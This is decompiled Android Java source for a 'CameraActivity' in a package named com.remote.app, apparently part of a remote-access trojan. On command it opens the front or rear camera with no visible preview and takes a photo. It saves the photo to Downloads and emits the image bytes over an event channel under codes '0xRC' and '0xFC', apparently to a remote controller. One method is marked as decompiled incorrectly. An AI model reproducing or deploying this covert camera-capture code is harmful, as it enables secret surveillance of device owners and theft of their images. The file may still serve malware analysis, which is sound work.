package com.remote.app;

import android.app.Activity;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import e.c;
import e.d;
import e.h;
import h.a;
import java.io.PrintStream;
import org.json.JSONException;
import org.json.JSONObject;

public class CameraActivity extends Activity {

    /* renamed from: f  reason: collision with root package name */
    private static final String[] f203f = {"android.permission.CAMERA"};

    /* renamed from: a  reason: collision with root package name */
    private Camera f204a;

    /* renamed from: b  reason: collision with root package name */
    private SurfaceTexture f205b;

    /* renamed from: c  reason: collision with root package name */
    private Integer f206c = 0;

    /* renamed from: d  reason: collision with root package name */
    private Camera.PictureCallback f207d = new c(this);

    /* renamed from: e  reason: collision with root package name */
    private a.C0010a f208e = new d(this);

    private boolean c() {
        for (String checkSelfPermission : f203f) {
            if (checkSelfPermission(checkSelfPermission) != 0) {
                return false;
            }
        }
        return true;
    }

    /* access modifiers changed from: private */
    public /* synthetic */ void d(byte[] bArr, Camera camera) {
        h(bArr);
        i(bArr);
        g();
    }

    /* access modifiers changed from: private */
    public /* synthetic */ void e(Object[] objArr) {
        PrintStream printStream;
        String str;
        if (objArr.length > 0) {
            if (objArr[0].booleanValue()) {
                printStream = System.out;
                str = "Event emitted successfully";
            } else {
                printStream = System.out;
                str = "Failed to emit event";
            }
            printStream.println(str);
            finish();
        }
    }

    private void f() {
        try {
            Bundle extras = getIntent().getExtras();
            extras.getClass();
            this.f206c = extras.getInt("camValue", 0) == 0 ? 0 : 1;
            this.f204a = Camera.open(this.f206c.intValue());
            this.f205b = new SurfaceTexture(10);
            Camera camera = this.f204a;
            if (camera != null) {
                Camera.Parameters parameters = camera.getParameters();
                this.f204a.setPreviewTexture(this.f205b);
                this.f204a.setParameters(parameters);
                this.f204a.startPreview();
                this.f204a.takePicture((Camera.ShutterCallback) null, (Camera.PictureCallback) null, this.f207d);
                return;
            }
            Log.d("Camera", "Failed to open camera");
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    private void g() {
        Camera camera = this.f204a;
        if (camera != null) {
            camera.setPreviewCallback((Camera.PreviewCallback) null);
            this.f204a.stopPreview();
            this.f204a.release();
            this.f205b.release();
            this.f204a = null;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:16:0x002b A[SYNTHETIC, Splitter:B:16:0x002b] */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0036 A[SYNTHETIC, Splitter:B:21:0x0036] */
    /* JADX WARNING: Removed duplicated region for block: B:27:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private void h(byte[] r5) {
        /*
            r4 = this;
            r0 = 0
            java.lang.String r1 = android.os.Environment.DIRECTORY_DOWNLOADS     // Catch:{ IOException -> 0x0025 }
            java.io.File r1 = android.os.Environment.getExternalStoragePublicDirectory(r1)     // Catch:{ IOException -> 0x0025 }
            java.io.File r2 = new java.io.File     // Catch:{ IOException -> 0x0025 }
            java.lang.String r3 = "captured_image.jpg"
            r2.<init>(r1, r3)     // Catch:{ IOException -> 0x0025 }
            java.io.FileOutputStream r1 = new java.io.FileOutputStream     // Catch:{ IOException -> 0x0025 }
            r1.<init>(r2)     // Catch:{ IOException -> 0x0025 }
            r1.write(r5)     // Catch:{ IOException -> 0x0020, all -> 0x001d }
            r1.close()     // Catch:{ IOException -> 0x0020, all -> 0x001d }
            r1.close()     // Catch:{ IOException -> 0x002f }
            goto L_0x0033
        L_0x001d:
            r5 = move-exception
            r0 = r1
            goto L_0x0034
        L_0x0020:
            r5 = move-exception
            r0 = r1
            goto L_0x0026
        L_0x0023:
            r5 = move-exception
            goto L_0x0034
        L_0x0025:
            r5 = move-exception
        L_0x0026:
            r5.printStackTrace()     // Catch:{ all -> 0x0023 }
            if (r0 == 0) goto L_0x0033
            r0.close()     // Catch:{ IOException -> 0x002f }
            goto L_0x0033
        L_0x002f:
            r5 = move-exception
            r5.printStackTrace()
        L_0x0033:
            return
        L_0x0034:
            if (r0 == 0) goto L_0x003e
            r0.close()     // Catch:{ IOException -> 0x003a }
            goto L_0x003e
        L_0x003a:
            r0 = move-exception
            r0.printStackTrace()
        L_0x003e:
            throw r5
        */
        throw new UnsupportedOperationException("Method not decompiled: com.remote.app.CameraActivity.h(byte[]):void");
    }

    private void i(byte[] bArr) {
        try {
            if (this.f206c.intValue() == 0) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("file", true);
                jSONObject.put("name", "captured_back_image" + System.currentTimeMillis() + ".jpg");
                jSONObject.put("buffer", bArr);
                h.a(AppClass.f202a).b().a("0xRC", jSONObject);
                Log.d("TAG", "saveImageToStorage: Rear Image");
            } else {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("file", true);
                jSONObject2.put("name", "captured_front_image" + System.currentTimeMillis() + ".jpg");
                jSONObject2.put("buffer", bArr);
                h.a(AppClass.f202a).b().a("0xFC", jSONObject2);
                Log.d("TAG", "saveImageToStorage: Front Image");
            }
            finish();
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_camera);
        if (c()) {
            f();
        } else {
            requestPermissions(f203f, 10);
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        g();
    }

    public void onRequestPermissionsResult(int i2, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i2, strArr, iArr);
        if (i2 == 10 && iArr.length > 0 && iArr[0] == 0) {
            f();
        }
    }
}
